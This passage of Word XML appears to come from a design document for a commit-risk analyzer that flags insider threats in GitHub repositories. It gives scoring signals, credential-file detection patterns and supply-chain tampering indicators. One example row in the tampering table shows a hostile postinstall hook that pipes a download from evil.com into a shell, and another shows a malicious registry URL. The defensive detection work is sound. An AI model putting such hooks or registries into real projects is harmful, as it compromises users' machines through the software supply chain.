            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>off_hours</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Commit before 7:00 AM or after 9:00 PM UTC</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>+1.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>author_committer_mismatch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Author email != committer email (excludes noreply@)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>+1.5</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>unsigned_commit</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GPG verification.verified is false</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>+0.5</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>force_push</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Passed from caller when force push detected</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>+2.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>large_deletion</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>More than 500 lines deleted in commit</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>+1.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Code: Metadata Check</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="2D2D2D"/>
          <w:sz w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        </w:rPr>
        <w:t>def _check_metadata_signals(self, commit_data: Dict) -&gt; List[str]:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    signals = []</w:t>
        <w:br/>
        <w:t xml:space="preserve">    commit = commit_data.get("commit", {})</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # Off-hours check (before 7am or after 9pm UTC)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    author_info = commit.get("author", {})</w:t>
        <w:br/>
        <w:t xml:space="preserve">    committed_at_str = author_info.get("date", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if committed_at_str:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        committed_at = datetime.fromisoformat(committed_at_str.replace("Z", "+00:00"))</w:t>
        <w:br/>
        <w:t xml:space="preserve">        hour = committed_at.hour</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if hour &lt; 7 or hour &gt;= 21:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            signals.append("off_hours")</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # Author / committer mismatch</w:t>
        <w:br/>
        <w:t xml:space="preserve">    author_email = commit.get("author", {}).get("email", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    committer_email = commit.get("committer", {}).get("email", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if author_email and committer_email and author_email.lower() != committer_email.lower():</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if "noreply" not in committer_email.lower():</w:t>
        <w:br/>
        <w:t xml:space="preserve">            signals.append("author_committer_mismatch")</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # Unsigned commit</w:t>
        <w:br/>
        <w:t xml:space="preserve">    verification = commit.get("verification", {})</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if not verification.get("verified", False):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        signals.append("unsigned_commit")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return signals</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 SAST Rule Matching on Diff</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The analyzer loads all enabled custom_rules with category="insider_threat" from the database and runs them against every added line (+) in the commit diff. This integrates directly with the platform's Custom Rules engine.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>For each match, the system captures the rule name, severity, file path, line number, matched text (truncated to 200 chars), and a diff snippet of +/-5 surrounding lines (truncated to 1500 chars).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Risk Score per Finding</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="LightGrid-Accent1"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4703"/>
        <w:gridCol w:w="4703"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Finding Severity</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Score Contribution</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>+2.5</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>+1.5</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Medium/Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>+0.5</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.3 Sensitive File Detection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Every file touched by a commit is checked against a comprehensive list of sensitive file patterns. Matches generate both a signal and a dedicated SensitiveFileAlert stored in github_sensitive_file_alerts.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Sensitive File Patterns</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="LightGrid-Accent1"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4703"/>
        <w:gridCol w:w="4703"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Patterns</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Environment Files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>.env, .env.*</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Secrets</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>secret, password, passwd, .htpasswd</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>SSH Keys</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>id_rsa, id_dsa, id_ecdsa, id_ed25519, authorized_keys</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Certificates</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>.pem, .pfx, .p12, .key</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Credentials</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>aws_credentials, credentials.json, token.json</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Password Stores</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>.kdbx, keystore, truststore</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>System Files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>shadow</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Score: +1.5 per sensitive file, capped at +3.0 total.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.4 Binary File Detection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Binary files added or modified in source repositories are suspicious as they may contain compiled malware, data exfiltration archives, or database dumps.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="LightGrid-Accent1"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4703"/>
        <w:gridCol w:w="4703"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Extensions</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Executables</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>.exe, .dll, .so, .dylib, .bin, .com, .msi, .app</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Archives</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>.zip, .tar, .tar.gz, .tgz, .rar, .7z, .bz2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Database Dumps</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>.sql, .sqlite, .sqlite3, .dump, .bak</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Compiled/Bytecode</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>.class, .pyc, .o, .obj, .wasm</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Score: +1.0 per binary file, capped at +2.0 total.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.5 Dependency Tampering Detection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Changes to dependency manifest files (package.json, requirements.txt, go.mod, etc.) are scrutinized for supply chain attack indicators. This is a critical defense against software supply chain compromise.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Monitored Dependency Files</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="2D2D2D"/>
          <w:sz w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        </w:rPr>
        <w:t>DEPENDENCY_FILES = {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "package.json", "package-lock.json", "yarn.lock",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "requirements.txt", "Pipfile", "Pipfile.lock", "poetry.lock", "setup.py", "setup.cfg",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "Gemfile", "Gemfile.lock",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "go.mod", "go.sum",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "pom.xml", "build.gradle", "build.gradle.kts",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "Cargo.toml", "Cargo.lock",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "composer.json", "composer.lock",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "pubspec.yaml", "pubspec.lock",</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Tampering Patterns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left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Pattern Type</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Detection Logic</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Example</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Typosquatting</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Known attack package names with character substitution</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>lod4sh, requ3sts, crypt0, col0rs, f4ker</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Vulnerable Version Pinning</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Dependencies pinned to known-vulnerable versions</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>django&lt;=2.x, log4j 2.0-2.14, lodash 0-3.x</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Custom Registry</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Non-standard registry URLs (potential malicious mirror)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>registry=https://evil.npmjs.org</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Post-Install Scripts</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>preinstall/postinstall hooks in package.json</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>"postinstall": "curl evil.com | sh"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Security Dep Removal</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Removal of security-related packages</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Removing helmet, bcrypt, bandit, snyk, eslint-plugin-security</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Monitored Security Dependencies</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="2D2D2D"/>
          <w:sz w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        </w:rPr>
        <w:t>SECURITY_DEPENDENCIES = [</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "helmet", "csurf", "cors", "express-rate-limit", "hpp",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "bcrypt", "argon2", "scrypt",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "jsonwebtoken", "passport", "express-session",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "django-cors-headers", "django-csp",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "safety", "bandit", "semgrep",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "snyk", "audit", "eslint-plugin-security",</w:t>
